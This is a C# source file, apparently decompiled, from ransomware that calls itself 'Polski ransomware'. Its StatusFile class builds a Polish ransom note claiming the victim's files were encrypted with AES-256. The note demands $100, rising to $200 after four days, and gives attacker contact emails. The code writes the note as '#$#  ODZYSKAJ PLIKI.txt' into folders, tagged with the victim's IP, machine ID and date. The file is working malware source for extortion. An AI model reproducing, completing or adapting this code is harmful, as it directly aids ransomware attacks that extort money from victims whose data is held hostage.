using System;
using System.IO;
using System.Text;

namespace AESxWin.Helpers;

public static class StatusFile
{
	public static string StaticText
	{
		get
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("    ");
			stringBuilder.AppendLine("                $$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                P_o_l_s_k_i – – r_a_n_s_o_m_w_a_r_e");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                $$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                $$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Masz problem ze znalezieniem potrzebnych danych ? ");
			stringBuilder.AppendLine("            ");
			stringBuilder.AppendLine("                Nie możesz otworzyć swoich dokumentów? ");
			stringBuilder.AppendLine("            ");
			stringBuilder.AppendLine("                Po otworzeniu ważnych plików widzisz tylko nic nie mówiący, dziwny ciąg znaków? ");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("                Twoje istotne pliki zostały zaszyfrowane !");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Twoje zdjęcia, dokumenty, bazy danych, zostały zaszyfrowane nie mozliwym do zlamania algorytmem aes-256");
			stringBuilder.AppendLine("                Metody tej do szyfrowania zawartosci dokumentów uzywaja sluzby wywiadowcze I wojsko.");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                $$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Gdy to czytasz proces jest zakończony, wytypowane pliki zostały zaszyfrowane a sam program usunięty z twojego komputera.");
			stringBuilder.AppendLine("                Odzyskac twoje dane mozna tylko przy pomocy dedykowanego programu deszyfrującego, wraz z jednorazowym kluczem wygenerowanym unikalnie dla ciebie! ");
			stringBuilder.AppendLine("                Dwa pliki odszyfrujemy bez opłaty aby nie być gołosłownymi, za pozostałe będziecie państwo musieli zapłacić 100$");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Aby odzyskać pliki skontaktuj się z nami pod adresem: Hc9@2.pl lub Hc9@goat.si");
			stringBuilder.AppendLine("                 ");
			stringBuilder.AppendLine("                Radzimy decydować się szybko, 4 dni od zaszyfrowania opłata zostanie podniesiona do 200$.");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                $$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-$$-");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Kontaktujac sie z nami pamietaj aby podac id-komputera I date");
			stringBuilder.AppendLine("                ");
			return stringBuilder.ToString();
		}
	}

	public static void WriteStatusFile(string string_0, string string_1, string string_2, DateTime dateTime_0, string string_3 = "#$#  ODZYSKAJ PLIKI.txt")
	{
		try
		{
			string arg = dateTime_0.ToString("dd-MM-yyyy HH:MM:ss");
			File.WriteAllText(Path.Combine(string_0, string_3), StaticText + $"                DANE IDENTYFIKACYJNE: IP={string_1} ID={string_2} Data={arg}");
		}
		catch
		{
		}
	}

	public static bool StatusFileExist(string string_0, string string_1 = "#$#  ODZYSKAJ PLIKI.txt")
	{
		return File.Exists(Path.Combine(string_0, string_1));
	}
}
